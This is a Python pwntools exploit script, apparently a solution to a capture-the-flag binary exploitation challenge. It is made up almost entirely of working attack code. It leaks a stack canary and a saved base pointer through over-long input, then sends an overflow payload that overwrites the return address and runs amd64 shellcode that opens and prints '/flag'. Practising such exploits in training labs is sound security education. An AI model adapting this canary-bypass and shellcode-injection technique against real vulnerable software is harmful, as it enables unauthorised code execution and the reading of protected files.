from pwn import *

p = process("/challenge/toddlerone_level5.0")

"""
rsp = int(input("Rsp = "))
rbp = int(input("RBP = "))
ret = rbp+0x8
canary = rbp-int(input("offset = "))
"""

rsp = 0x00007ffe90933ad0
rbp = 0x00007ffe90933bb0
ret = 0x00007ffe90933bb8
canary = 0x00007ffe90933b98
in_addr = 0x7ffe90933b20


before_ret = ret - in_addr
before_canary = (canary - in_addr)
p.readuntil(b'Payload size: ')
canary_payload = b'121 REPEAT' + b'a' * \
    (before_canary-6-0x18) + b'\x12\x22\x7c\xf1\x01\x0f\x41\x69' + b'a'*0x11
print("canary payload = ", canary_payload)
print("canary payload length = ", len(canary_payload))
p.send(b'121 REPEAT' + b'a'*(before_canary-6-0x18) +
       b'\x12\x22\x7c\xf1\x01\x0f\x41\x69' + b'a'*0x11)
p.readuntil(b'You said: '+b'REPEAT'+b'a'*(before_canary-6 - 0x18) +
            b'\x12\x22\x7c\xf1\x01\x0f\x41\x69' + b'a'*0x11)
x = p.readuntil(b'This challenge has a trick hidden')
Canary = b'\x00' + x[:7]
xcanary = b'A' + x[:7]
print("canary = ", Canary)
p.readuntil(b'Payload size: ')

prev_rbp_payload = b'144 REPEAT' + b'a' * \
    (before_canary-6-0x18) + b'\x12\x22\x7c\xf1\x01\x0f\x41\x69' + \
    b'a'*0x10 + xcanary + b'x'*0x10

print("Previous rbp payload = ", prev_rbp_payload)
print("previous rbp payload length = ", len(prev_rbp_payload))
p.send(prev_rbp_payload)
p.readuntil(b'x'*0x10)
x = p.readuntil(b'\n')
x = x[:6]

prev_rbp = int.from_bytes(x, 'little')
print("Previous rbp = ", hex(prev_rbp))
print(x)


p.readuntil(b'Payload size: ')
ret_addr = prev_rbp-0x1d8+0x8
ret = ret_addr.to_bytes(8, 'little')
print("Return address = ", hex(ret_addr))


context.arch = 'amd64'
assem = """
	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 60		
	syscall			
file:
	.string "/flag"
"""
shellcode = asm(assem)
print("shellcode length = ", len(shellcode))

final_payload = b'231 aaaaaa' + b'a' * \
    (before_canary-6-0x18) + b'\x12\x22\x7c\xf1\x01\x0f\x41\x69' + \
    b'a'*0x10 + Canary + b'x'*0x18 + ret + shellcode
print("payload length = ", len(final_payload))
p.send(final_payload)
p.readuntil(b'Goodbye!\n')
print(p.readall())
